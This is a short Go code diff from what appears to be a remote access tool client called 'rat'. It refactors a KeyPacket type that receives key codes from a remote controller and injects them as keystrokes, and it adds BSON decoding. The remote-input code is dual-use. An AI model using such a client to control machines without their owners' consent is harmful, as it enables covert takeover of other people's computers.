@@ -1,13 +1,15 @@
 package main
 
 import (
-	"rat/client/screen"
 	"rat/client/network/header"
+	"rat/client/screen"
+
+	"github.com/pkg/bson"
 )
 
 type KeyPacket struct {
-	Key  int `network:"receive"`
-	Type int `network:"receive"`
+	Key  int "keyCode"
+	Type int "state"
 }
 
 func (packet KeyPacket) Header() header.PacketHeader {
@@ -18,4 +20,9 @@ func (packet KeyPacket) OnReceive() error {
 	screen.Key(uint16(packet.Key), packet.Type)
 
 	return nil
+}
+
+func (packet KeyPacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
